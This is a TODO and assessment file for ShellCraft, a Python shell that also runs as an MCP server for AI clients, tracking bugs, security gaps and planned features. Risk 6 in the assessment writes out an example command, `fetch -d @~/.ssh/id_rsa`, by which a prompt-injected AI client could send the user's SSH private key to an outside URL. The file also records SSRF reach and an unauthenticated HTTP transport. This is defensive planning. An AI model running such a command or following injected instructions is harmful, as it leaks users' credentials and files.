# ShellCraft — TODO

> First assessment: v0.1.0 (`main` @ 72a9897), when there were 42 tests. Second full assessment: 2026-09-28 (`main` @ 93e719b). Third full assessment: 2026-09-30 (`main` @ 3a74273). Checked items have been done since then.
> **Current state:** 37 builtins (including `alias`, `history`, `diff` and `du`), a settings system (OS commands off by default) with API keys for modules (`ENV_SETTINGS`), modules `fetch`, `filter`, `myip`, `ip2geo`, `queryDns`, `queryCert` and `queryCensys`, the module authoring kit (`templates/`, `tools/modtest.py`, `tools/mkprompt.py`), switch completion, typed MCP parameters, man-page resources, hot reload and an HTTP transport. 355 tests pass, in ~2.5 s on Python 3.14 (with the `censys` extra). About 6,500 lines of application code (core, modules, tools) and 2,500 lines of tests. An offline `Install/` bundle (Windows installer, Ubuntu 26.04 `.deb`s, wheels for Windows/Linux × CPython 3.11–3.14, `setup.ps1` / `setup.sh`) makes air-gapped installs possible.

## Assessment

**What's solid**
- The layering is clean. The parser, the pipeline executor and the UI are separate. `run_line()` is UI-agnostic and shared by the REPL, the MCP server and the tests.
- The three-file module contract (`.py` / `.md` / `.skill`) is simple and works well. A broken module becomes a warning, not a crash.
- The MCP integration is safe by default: the pipeline tool can't redirect to files, can't use shell-state builtins, and can't run system commands.
- The UX feels good: themes, ghost text, delayed spinner, auto-pager and error panels that point at the failing segment.

**Biggest risks**
1. **Security of the MCP surface.** `fetch` can request *any* URL, including loopback and private addresses. *(Accepted, like reading any file the user can read: see Won't do.)*
2. **Shell-grammar gaps fail silently.** `2>` is misparsed, and `<`, `;` and `&&` become plain arguments. Users expecting POSIX behavior can get wrong results with no error. *(Fixed: they're now rejected with a parse error.)*
3. **The system-command fallback is capture-only.** Interactive programs misbehave, and "no match" exit codes abort the pipeline. *(Now off by default, and the ported builtins cover the common commands. Accepted: see Won't do.)*
4. **Only tested on Linux.** None of the Windows paths have been run yet.
5. **Packaging is broken.** A non-editable install crashes on startup (see Bugs). Nothing caught it because there's no CI and the tests run from the source tree. *(Fixed; the packaging smoke test in CI is still open.)*
6. **The MCP surface can exfiltrate.** Reading any file is accepted, and so is `fetch` reaching any URL, but together they let a prompt-injected client run `fetch -d @~/.ssh/id_rsa https://…`. The per-module exposure switch (Security) is the fix that fits the "modules stay as they are" decision.

**Second assessment (2026-09-28)**
- The architecture held up well: 7 modules and 37 builtins were added without changing the pipeline design, and the three-file contract now drives MCP schemas, man-page resources and Tab completion.
- The docs are thorough and mostly in sync. The test suite is fast and broad, but it only exercises the source tree, so packaging and platform bugs slip through.
- The main gaps are distribution (packaging, CI, license), hardening the MCP boundary (timeouts, exposure, argument handling), and exit-status semantics.

**Third assessment (2026-09-30)**
- The design is still sound, and lint is clean where it matters: ruff finds no pyflakes errors (only 35 style hints), and mypy's 41 errors are annotation-level (missing `None` narrowing, `list` vs generator), none a real bug.
- The main new risks are another operator that slips through the parser (`&`, the same class as the fixed `;` bug), `config.json` handling (a malformed value crashes every mode, and two open shells overwrite each other's changes), and the MCP HTTP transport having no authentication, which matters on shared lab machines.
- Offline installs were verified in a network-less Ubuntu 26.04 container. `setup.ps1` has only been syntax-checked, not run on Windows.

Items marked **(verified)** were reproduced during the assessment.

---

## 🐞 Bugs — P0

- [x] **Invalid custom theme color crashes startup**: `all_themes()` now checks each color against both Rich and prompt_toolkit, keeps the base preset's color, and the CLI prints a warning on stderr. — `core/themes.py`
- [x] **Unsupported operators were passed on as arguments**: `rm a ; ls` also deleted a file named `ls`, and `a 2> err.txt` sent stdout to `err.txt`. `;`, `&&`, `||`, `<`, `2>`, `2>>`, `2>&1`, `&>` and `>&` now raise a `ParseError` until they are implemented (see Features). — `core/parser.py`
- [x] **A non-editable `pip install .` crashed on startup**: `packages = ["core"]` left out `core.commands`, and the wheel had no modules. The wheel now ships `core.commands` and the bundled modules (as `core/bundled_modules`, with their `.md` and `.skill` files). An installed copy loads those modules, and a source checkout or editable install still uses `./modules`. Verified by installing the wheel into a clean venv. — `pyproject.toml`, `core/cli.py`
- [ ] **Packaging leftovers**: load a user directory `~/.shellcraft/modules` next to the bundled ones, so an installed copy can add modules without `--modules`. `tools/` and `templates/` still work from a source checkout only. The generic top-level name `core` can collide with other packages in site-packages, so move it under a `shellcraft/` package. — `core/cli.py`, `core/loader.py`, `pyproject.toml`
- [x] **MCP values that start with `-` became switches**: `filter` with `{"pattern": "-v"}` failed, and text from untrusted content could inject switches. `params.to_argv` now passes such a value as `--flag=VALUE` and puts `--` before the positionals. — `core/params.py`
- [x] **Windows 11 console I/O**: the interactive shell used whatever `sys.stdin`/`sys.stdout` were and trusted `isatty()` (True for `NUL`), and prompt_toolkit could read keys from `CONIN$` while putting a different handle into raw mode. It now opens `CONIN$`/`CONOUT$` itself with VT processing on (`WindowsConsole`), and stdout/stderr are UTF-8 for pipes and files. `Shell` owns that session (a context manager): it enters the prompt_toolkit app session before the `PromptSession` is built, moves Rich to a truecolor VT console on `CONOUT$`, and on exit, a crash or a failed setup restores the Rich console, the app session and the console mode in reverse order. *(2026-10-06: rewritten to drive the devices directly, with `Win32Input` bound to the `CONIN$` handle and a plain `Vt100_Output` on `CONOUT$`; the process's std handles are no longer redirected.)* *(Needs a pass on a real Windows 11 machine: see the Windows verification item.)* — `core/shell.py`, `core/cli.py`, `core/stdio.py`
- [x] **Windows: redirected output crashed on box drawing**: error panels on `2>` and `mkprompt > prompt.txt` raised `UnicodeEncodeError` under cp1252. — `core/stdio.py`, `tools/`
- [x] **Windows: `dir`/`type` output was decoded as UTF-8** although `cmd.exe` writes the OEM code page; internal commands now run with `cmd /u` and are read as UTF-16. — `core/pipeline.py`
- [ ] **`&` is still passed on as an argument** **(verified)**: `rm -f a & ls` deletes both `a` and `ls`, and `echo hi & echo there` prints `hi & echo there`. It's the same class as the fixed `;` bug. Reject an unquoted `&` with a `ParseError` until background jobs exist. — `core/parser.py`
- [ ] **A malformed `config.json` crashes startup in every mode, MCP included** **(verified)**: `{"env": [...]}`, `{"settings": [...]}` or `{"themes": [...]}` ends in `AttributeError`. Check each section's type in `load_config()`, then drop it with a warning. — `core/config.py`, `core/settings.py`, `core/themes.py`
- [ ] **`cp -r DIR DIR/sub` recurses into itself** **(verified)**: it creates ~500 nested `DIR/sub/DIR/sub/…` directories, then fails with `RecursionError`. Refuse a destination inside the source, as GNU `cp` does ("cannot copy a directory into itself"). — `core/commands/files.py`
- [x] **Pager search `n` got stuck on the last screen**: the last match is now tracked apart from the scroll position, so `n`/`N` step through every match, and matches are highlighted in reverse video. — `core/output.py::page`

## 🔒 Security — P0

- [ ] **Per-module MCP exposure switch**: `expose = false` in `.skill`, and a `--expose name,...` CLI flag, so sensitive modules stay local-only. This also closes the `fetch -d @FILE` exfiltration path and the paid-quota use of `queryDns`/`queryCensys` without touching the modules. It must apply to the `shellcraft_pipeline` tool too, not only to the per-module tools. — `core/loader.py`, `core/mcp_server.py`
- [ ] **No timeout on MCP tool calls**: a hung module holds a worker thread forever. Add a per-call timeout (`anyio.fail_after`) and caps on stdin and output size. Easy triggers: `du /`, `find /`, `tree /`, or a catastrophic regex in `grep`/`filter`. — `core/mcp_server.py`
- [x] **History records everything**: a line typed with a leading space is no longer saved (bash's `ignorespace`). *(Values in `settings NAME VALUE` are still redacted.)* — `core/shell.py`
- [ ] **History redaction can be bypassed** **(verified)**: `redact_line()` only matches a line that starts with `settings`, so `\settings NAME VALUE`, or an alias such as `alias s=settings`, saves the API key to `~/.shellcraft/history` in plain text. Redact after alias expansion, or match any first word that resolves to `settings`. — `core/settings.py`, `core/shell.py`
- [ ] **The MCP HTTP transport has no authentication**: loopback-only binding and DNS-rebinding checks stop browsers and remote hosts, but any other local user or process can connect to the port and read every file the server's user can read. That matters on shared lab machines. Require a bearer token (generated at startup, printed on stderr, or taken from `SHELLCRAFT_MCP_TOKEN`). — `core/mcp_server.py`
- [ ] **API keys are stored in plain text** in `config.json` (mode 600, which doesn't protect them on Windows). Offer the OS keyring (`keyring` package) as an optional backend. — `core/settings.py`

## 🔧 Bugs / polish — P1

- [ ] **Hot reload races with MCP calls**: `ModuleRegistry.load()` empties `self.modules` and then refills it, while tool calls run in worker threads. A call that arrives mid-reload gets "Unknown tool" or "command not found". Build the new dict first, then swap it in. — `core/loader.py`
- [ ] **Two open shells overwrite each other's config** **(verified)**: each session writes its whole in-memory config, so an alias (or API key) saved in one shell is lost when the other changes the theme. The write isn't atomic either, so a crash mid-write truncates `config.json` along with the stored keys. Re-read and merge only the changed key before saving, and write through a temp file plus `os.replace`. — `core/config.py`, `core/builtins.py`
- [ ] **`grep -m 0` prints one line** **(verified)**: GNU grep prints nothing. `match_lines` appends before checking the limit. — `core/commands/text.py`
- [ ] **A quoted `~` in a redirect target is still expanded** **(verified)**: `echo hi > '~/f'` writes to the home directory, although quoting keeps `~` literal everywhere else. The tokenizer already expands unquoted `~`, so drop the second `expanduser()`. — `core/pipeline.py`
- [x] **One-shot `-c` mode removed** (2026-10-02): ShellCraft is used as the interactive shell (`python main.py`) or an MCP server, never as `shellcraft -c "…"`. Its open bugs went with it (a `BrokenPipeError` traceback when piped into `head`, no exit 130 on Ctrl-C, not passing on a system command's exit code), and so did its Windows-console-for-the-pager special case. — `core/cli.py`
- [ ] **A redirect silently creates missing directories** **(verified)**: `echo a > typo/dir/f.txt` makes `typo/dir/`. POSIX shells fail with "No such file or directory", which catches typos. Drop the `mkdir(parents=True)`. — `core/pipeline.py`
- [ ] **Ctrl-C abandons the module worker thread**, which keeps running. Add a cooperative cancel flag in `modkit` that modules can check, or at least document the behavior. — `core/output.py::make_spinner_runner`
- [ ] **`to_text()` flattens at a fixed width of 100**, so `help | filter` ignores the real terminal width. Pass the console width when there is one. — `core/context.py`
- [ ] **`show()` renders twice** (a capture pass, then a print pass) and loads huge outputs fully into Rich. Reuse the captured ANSI, and cap or stream very large outputs into the pager. — `core/output.py`
- [x] **Rich and the prompt disagreed on the terminal size**: on Windows Rich used the full window width while the prompt left out the last column (so full-width lines took two rows), and Rich read the size through the std handles instead of `CONOUT$`. On both platforms an exported `COLUMNS`/`LINES` froze Rich's size, even when passed to `Console.__init__`. `TerminalConsole` now asks the current app session's output, so both agree and follow resizes. On Windows that's the visible window (`srWindow`, capped at the buffer width), with delayed wrap (`DISABLE_NEWLINE_AUTO_RETURN`) so the whole width is usable, or one column less if the console refuses it. — `core/shell.py`
- [x] **Linux: the prompt and the pager ran in 256 colors** while Rich used truecolor, because prompt_toolkit reads only `TERM`, so the theme's colors were rounded off in the prompt. The shell now uses a truecolor output when `COLORTERM` is `truecolor`/`24bit` and stdout is a terminal; `NO_COLOR` and `PROMPT_TOOLKIT_COLOR_DEPTH` still win. — `core/shell.py`
- [x] **Windows: the prompt's `~` shortening was case-sensitive**: it now compares with `os.path.normcase`. — `core/shell.py`
- [x] **`cd` inside a pipeline changed the real cwd** (`cd x | pwd`): `cd` is now refused unless it's alone on the line (no pipe, no redirect). — `core/pipeline.py`
- [ ] **Loader hygiene**: there is no parent package, so relative imports inside modules fail. *(Stale `sys.modules["shellcraft_modules.*"]` entries are now cleared on every reload.)* — `core/loader.py`
- [x] **Switch completion**: Tab completes each command's options and option values from its `.skill` `[[args]]` (including the new `values` key) and its `.md` options table. It is modular, with no per-module code.
- [ ] **Completer ignores quotes**: paths containing spaces complete wrongly. — `core/completer.py`
- [ ] **Positional values aren't completed**: `queryCensys <Tab>` offers file names instead of `host` / `cert` / `search`, although the `.skill` `[[params]]` entry `command` lists them in `values`. Complete positionals from such entries. — `core/options.py`, `core/completer.py`
- [x] **Dead code**: `ShellContext.interactive` is now read by `settings NAME` to choose the hidden prompt.
- [ ] **Version is defined twice** (`pyproject.toml` and `core/__init__.py`). Use a single dynamic version. — `pyproject.toml`
- [ ] **`sort -u -k N` dedupes whole lines**, not keys as in GNU sort. — `core/commands/text.py`
- [ ] **DEVELOPMENT.md drift**: the context-flags table lists only `env` as `sensitive` and leaves `history` out of the `stateful` list. — `DEVELOPMENT.md`

## ⬆️ Upgrades — P1

- [x] **API-key precedence**: at startup a variable already in the environment (the user's shell, an MCP client's `env` block) now wins over the stored key, and `settings` shows `from environment (stored ••••ab12 unused)`. `settings NAME VALUE` during a session still replaces it. — `core/settings.py`
- [ ] **Streaming pipelines**: allow `run()` to return an iterator of lines so that large inputs don't sit in memory, while plain `str` returns keep working. — `core/pipeline.py`, `core/loader.py`
- [x] **MCP improvements:**
  - [x] Every module's `.md` and every MCP-usable builtin's manual is a resource at `shellcraft://man/<name>`.
  - [x] Streamable-HTTP transport: `--mcp-http 127.0.0.1:8765` (loopback addresses only, DNS-rebinding protection on).
  - [x] `tools/list_changed` and `resources/list_changed` on reload, both to `subscriptions/listen` streams and to older clients' connections.
  - [x] `.skill` `[[params]]` declare typed, named parameters (the MCP input schema); all bundled modules and the template use them. Modules without them keep the raw `args` array. — `core/params.py`
- [x] **Hot reload**: the modules folder is polled for `.py`/`.md`/`.skill` changes, in the shell (before each command) and the MCP server (every second). The `hot_reload` setting turns it off. — `core/watch.py`
- [x] **`fetch`**: `--max-size` (default 10M), `-H/--header`, `-X/--method`, `-d/--data` (text, `@FILE`, `@-`), `--retry N` with backoff and `Retry-After`, and rejection of binary content.
- [ ] **Themes**:
  - [x] Dracula, Gruvbox, Catppuccin and Tokyo Night presets
  - `theme preview NAME` (no save)
  - light-terminal variants
  - theme validation warnings shown in the banner
- [ ] **Exit status**:
  - a `status` builtin or `$?`
  - show the code in the prompt as `[✗ 1]`
  - `grep` returns status 1 when nothing matches, so `status` / `$?` and the prompt show it

## ✨ Features — P2

- [ ] **Shell grammar**:
  - `<` input redirect
  - `2>` / `2>&1`
  - `;`, `&&`, `||`
  - `$VAR` / `%VAR%` expansion with `export`
  - glob expansion (`*.log`)
  - `~user`
- [x] **Ported builtins, first batch**: `ls`, `cat`, `grep`, `echo`, `tee`, `head`, `tail`, `wc`, `sort`, `uniq`, `date`, `mkdir`, `cp`, `mv`, `rm`, plus the `settings` command with OS commands off by default.
- [x] **Ported builtins, second batch**: `find`, `touch`, `which`, `tree`, `cut`, `tr`, `env` (`env` is blocked in MCP as sensitive).
- [x] **`alias` / `unalias`**: saved in `config.json`, expanded per pipeline step, `\NAME` skips an alias, not applied over MCP. — `core/aliases.py`
- [x] **`history`, `diff`, `du`**: `history [N] | -c`; `diff` with classic and unified (`-u`/`-U N`) output, `-i -w -b -q -s -r`, directories and binary files, output identical to GNU diff; `du` with apparent sizes (`-s -h -a -d N -c -S -b`), matching GNU `du --apparent-size`.
- [ ] **More builtins**: `source`, `sleep`, `time`, `type`, `basename` / `dirname`.
- [ ] **Startup rc file** `~/.shellcraft/rc` (aliases, env, theme).
- [ ] **Input-line syntax highlighting** with a prompt_toolkit lexer: known commands green, unknown ones red, operators in the accent color. Also:
  - a bottom toolbar (cwd, git branch, last command duration)
  - Ctrl-R history search
- [x] **Module authoring kit**: `templates/` (a reference module plus a guide), `tools/modtest.py` (the tester, including `[[tests]]` in `.skill` files and `--preview`), and `tools/mkprompt.py` (an AI prompt that writes `.md`/`.skill` from a `.py`).
- [ ] **Module scaffolding**: a `new-module NAME` builtin that copies the template trio and renames it. Also a `modtest` builtin inside the shell, and running `modtest --all --strict` in CI.
- [ ] **Modules as packages**: `modules/<name>/` directories, per-module requirements, and version/author metadata in `.skill`.
- [ ] **Structured data mode**: JSON-lines between modules, with `select`, `where`, `sort-by` and a `table` renderer, for Nushell-style pipelines.
- [ ] **Background jobs** (`cmd &`, `jobs`, `fg`) and per-command timing.
- [ ] **`ask "..."` builtin**: a Claude-powered assistant that uses the loaded modules as tools and their `.skill` files as guidance.
- [x] **Network lookup modules**: `ip2geo` (ip-api.com), `queryDns` (DnsDumpster), `queryCert` (crt.sh) and `queryCensys` (Censys Platform SDK), plus API-key settings (`ENV_SETTINGS`: masked in `settings`, hidden prompt, exported in every mode including MCP).
- [ ] **More modules**: `json` (pretty-print/query), `hash`, `whois`, `weather`.
- [x] **Console diagnostics report**: the `diagnostics` setting (or `--diag`) prints a plain-text report at startup, before the banner, to paste into a bug report. It lists every size source side by side (the OS per fd, `shutil`, prompt_toolkit, the shell's Rich console, Rich's own detection), color detection on both sides, std stream encodings and the terminal environment variables, and on Windows the `CONOUT$` buffer vs. visible window, console modes before and after (flags spelled out), code pages and where the std handles point. Each probe is guarded, so a failing check is a line, not a crash. — `core/diagnostics.py`
- [x] **MCP HTTP server from inside the shell** (2026-10-02): `mcp start [HOST:PORT] [--allow-system]`, `mcp stop`, `mcp restart`, `mcp` (status) and `mcp log [N]` run `--mcp-http` as a child process in its own process group, logging to `~/.shellcraft/mcp-http.log`; it stops when the shell exits. — `core/mcp_child.py`, `core/builtins.py`
- [ ] **`mcp start` leftovers**: a server is orphaned if the shell is killed outright (`kill -9`, closing the terminal window on Windows); have the child exit when its parent's pid goes away. Optionally an autostart setting. *(The prompt shows `● mcp :PORT` while it runs, `✗` if it died.)* — `core/mcp_child.py`, `core/shell.py`
- [ ] **A `diag` builtin**: the same report on demand, to check the size again after resizing the window. — `core/builtins.py`

## 🧪 Tests / CI / docs — P1

- [ ] **Missing tests**:
  - the completer
  - pager key handling (using prompt_toolkit pipe input)
  - the `show()` paging threshold
  - `theme` persistence
  - custom theme parsing
  - the banner's narrow-terminal fallback
  - a packaging smoke test: build the wheel, install it into a clean venv, and run `shellcraft --version` (it would have caught the `core.commands` crash)
- [ ] **`.gitlab-ci.yml`**: run pytest on Linux and Windows runners, Python 3.11–3.14 (development happens on 3.14), plus the packaging smoke test and `modtest --all --strict`.
- [ ] **Tooling**: ruff (lint and format) and mypy config in `pyproject.toml`, plus a pre-commit hook. Neither is installed in the dev environment yet; add them to the `dev` extra. A trial run (2026-09-30) found no real ruff errors (35 style hints, 14 auto-fixable) and 41 annotation-level mypy errors to clear before mypy can gate CI.
- [ ] **Offline bundle upkeep**: `Install/` adds ~112 MB of binaries to the git history, and every refresh adds more. Consider publishing it as a release asset or tracking it with Git LFS. Run `setup.ps1` on a real Windows machine (so far it's only been syntax-checked), and document how to refresh the wheels.
- [x] **Docs split**: README (install and usage), `templates/README.md` (module authoring), `DEVELOPMENT.md` (layout, architecture, tests).
- [ ] **Docs**: a README screenshot or asciinema recording, and a CHANGELOG. *(LICENSE: MIT, added.)*
- [ ] **Windows verification pass**: covering prompt rendering (Windows Terminal and classic conhost, where `⚡` may render one cell wide), the pager, `cmd` builtins, paths and the MCP stdio server. Also `python main.py < NUL` and `python main.py > NUL`, the cases the console fixes target. For the window size: run `python main.py --diag` and keep the report, check that full-width panels leave no blank row after them (delayed wrap) and that `help` re-wraps after a resize, in both Windows Terminal and classic conhost.

## 🚫 Won't do

The OS-program fallback (`system_commands` / `--allow-system`) stays opt-in and capture-only. The portable builtins and modules are the supported path.

- **Nonzero exit from a system command aborts the pipeline** (for example grep's "no match" status 1). — `core/pipeline.py::_run_system`
- **Interactive system programs misbehave** (`vim`, `top`, `ssh`, `python`) because their stdin and stdout are pipes. — `core/pipeline.py`
- **A system command's stderr is dropped on success.** — `core/pipeline.py`
- **Captured system output loses its colors** (no `FORCE_COLOR` / `CLICOLOR_FORCE`). — `core/pipeline.py`

MCP file access is deliberately not sandboxed: the AI can read every file the user running the server can read.

- **`--root DIR` sandbox for MCP file reads** (`fetch` and the read builtins `cat`, `grep`, `ls`, `find`, `tree`…). File-*changing* commands and redirects stay blocked in MCP. — `core/mcp_server.py`

The bundled modules (`fetch`, `filter`, `ip2geo`, `myip`, `queryCensys`, `queryCert`, `queryDns`) stay as they are: no further fixes or improvements are planned for them.

- **`fetch`: SSRF blocking over MCP.** Loopback, private, link-local and cloud-metadata URLs stay reachable, with no URL allowlist. *(Its max response size was done: `--max-size`.)* — `modules/fetch.py`
- **`queryDns` / `queryCensys` spend the user's API quota through MCP**, with no per-module opt-out in their `.skill` notes. — `modules/queryDns.skill`, `modules/queryCensys.skill`
- **`queryCensys`**: checking the table layouts against a real token (only the error paths were live-tested), `--at-time` for host history, and `web HOSTNAME:PORT` lookups (`get_web_property`). — `modules/queryCensys.py`
- **`queryDns`**: confirming the CNAME record shape with a domain that has CNAMEs, and the Plus-only `?map=1` domain map. — `modules/queryDns.py`
- **`queryCert`**: a per-test `timeout` key in `[[tests]]`, because crt.sh often needs more than modtest's 10 s. — `tools/modtest.py`
- **`ip2geo`**: the ip-api.com batch endpoint (`POST /batch`, up to 100 IPs per request) for long lists. — `modules/ip2geo.py`
- **`myip`**: a short-lived result cache, parallel lookups for many IPs, comma-separated `--field` lists, and a clear message for private-range IPs. — `modules/myip.py`

The ShellCraft name stays fixed: integrators can't rebrand the shell.

- **Custom brand / prompt name**: a `brand` block (`name`, `prompt`, `icon`, `tagline`) in `config.json` or a brand file, used by every on-screen string: the prompt, the `help` title, the banner, `--version`, `which`, the goodbye line and the MCP server title. It would need a single `core/brand.py`, a full A–Z/0–9 banner font with a one-line fallback, and validation of the value (no control characters, a length cap). Internal identifiers (`~/.shellcraft`, `SHELLCRAFT_*`, `shellcraft_pipeline`, `shellcraft://man/`) would stay unchanged. — `core/shell.py`, `core/banner.py`, `core/builtins.py`, `core/cli.py`

---

**Legend:** **P0** = fix soon (correctness / security) · **P1** = next iteration · **P2** = nice to have · **Won't do** = out of scope, recorded on purpose
